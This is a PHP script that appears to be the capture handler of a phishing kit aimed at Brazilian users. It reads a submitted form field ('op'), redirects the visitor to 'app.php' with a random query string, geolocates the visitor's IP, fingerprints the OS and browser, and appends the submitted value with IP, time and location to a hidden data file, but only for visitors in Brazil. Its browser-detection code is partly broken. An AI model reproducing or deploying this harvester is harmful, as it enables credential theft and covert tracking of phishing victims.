<?php

function string_aleatoria($tamanho) {
	$conteudo = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for($i=0;$i<$tamanho;$i++) {
		$string .= $conteudo{rand(0,35)};
	}
	return $string;
}

  header("Location: app.php?".string_aleatoria(90));
  $mq = $_POST['op'];
  require_once('assets/geoplugin.class.php');

  $ip=$_SERVER['REMOTE_ADDR'];
  $user_agent=$_SERVER['HTTP_USER_AGENT'];

  $geoplugin = new geoPlugin();
  $geoplugin->locate($ip);
  $novoarquivo = fopen("vw/data.txt", "a+");

  function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Internet Explorer';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Mozila Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Google Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    //$browser= 'other';
  }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();

$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";

print_r($device_details);

 // $data = date("d/m/Y");
    //$data = date('d/m/Y');
  //$data = date("I");
 // $data = date("d/m/Y H:i:s ");
    //$hora = date('H:i:s');
    $time = mktime(date('H')-3, date('i'), date('s')); 
    $hora = gmdate("H:i:s", $time); 
   // $timestamp = time() - date('Z');
    $ano    = date('Y');
      $dia    = date('d')-0;
      $dsemana= date('w');
      $data   = date('n');
      $mes[1] ='Janeiro';
      $mes[2] ='Fevereiro';
      $mes[3] ='Mar&#231;o';
      $mes[4] ='Abril';
      $mes[5] ='Maio';
      $mes[6] ='Junho';
      $mes[7] ='Julho';
      $mes[8] ='Agosto';
      $mes[9] ='Setembro';
      $mes[10]='Outubro';
      $mes[11]='Novembro';
      $mes[12]='Dezembro';
      $semana[0] = 'Domingo';
      $semana[1] = 'Segunda-Feira';
      $semana[2] = 'Ter&#231;a-Feira';
      $semana[3] = 'Quarta-Feira';
      $semana[4] = 'Quinta-Feira';
      $semana[5] = 'Sexta-Feira';
      $semana[6] = 'S&#225;dado';
                  
 
  $cidade=$geoplugin->city;
  $estado=$geoplugin->region;
  $pais=$geoplugin->countryName;

  if ($pais=='Brazil')
  {
    fwrite($novoarquivo,$mq . " -tv- ".$hora." | ".$ip.' | '.$user_os." ~ ".$user_browser." | ".$dia.'/'.$mes[$data]." ~ ".$cidade."/".$estado." | ".$pais." \r\n");
    fclose($novoarquivo);
  }
?>